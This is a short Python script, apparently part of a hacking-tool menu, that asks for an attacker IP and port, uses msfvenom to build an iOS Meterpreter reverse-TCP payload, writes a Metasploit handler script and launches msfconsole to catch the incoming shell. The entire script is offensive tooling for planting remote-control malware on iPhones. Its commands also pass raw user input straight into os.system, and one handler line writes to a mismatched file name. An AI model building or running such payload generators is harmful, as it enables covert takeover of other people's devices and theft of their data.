#CREADO POR GEERXOS GITHUB: https://github.com/GeerxOS

import os

banner="""

 /'\_/`\          /'___\ 
/\      \    ____/\ \__/ 
\ \ \__\ \  /',__\ \ ,__|
 \ \ \_/\ \/\__, `\ \ \_/                 
  \ \_\\ \_\/\____/\ \_\ 
   \/_/ \/_/\/___/  \/_/ 

/\  _`\ /\ \            /\_ \  /\_ \     
\ \,\L\_\ \ \___      __\//\ \ \//\ \    
 \/_\__ \\ \  _ `\  /'__`\\ \ \  \ \ \   
   /\ \L\ \ \ \ \ \/\  __/ \_\ \_ \_\ \_ 
   \ `\____\ \_\ \_\ \____\/\____\/\____|
    \/_____/\/_/\/_/\/____/\/____/\/____/

"""
def ios64_tcp():
    os.system("clear")
    print(banner)
    print("Using: apple_ios/aarch64/meterpreter_reverse_tcp")
    ip = input("Attacker IP: ")
    port = input("Listen Port: ")
    name = input("Name for the file: ")
    print("Ok!")
    print("+--------------------------------------------+ ")
    print("+-> Payload data")
    print("+-> Payload: apple_ios/aarch64/meterpreter_reverse_tcp")
    print("+-> Attacker IP: "+ip+"")
    print("+-> Listen Port: "+port+"")
    print("+-> Name: "+name+"")
    print("+--------------------------------------------+ ")
    print("Creating payload [01]")
    os.system("msfvenom -p apple_ios/aarch64/meterpreter_reverse_tcp LHOST="+ip+" LPORT="+port+" -f macho -o "+name+".macho")
    print("Payload created! [01]")
    print("Saved in: "+name+".macho")
    print("Running metasploit-framework...")
    os.system("echo 'use exploit/multi/handler' >> ios64_tcp_tcp.rb")
    os.system("echo 'set payload apple_ios/aarch64/meterpreter_reverse_tcp' >> ios64_tcp.rb")
    os.system("echo 'set LHOST "+ip+"' >> ios64_tcp.rb")
    os.system("echo 'set LPORT "+port+"' >> ios64_tcp.rb")
    os.system("echo 'exploit' >> ios64_tcp.rb")
    os.system("gnome-terminal -- msfconsole -r ios64_tcp.rb &")
    input("Enter to return to the menu! ")
    os.system("clear")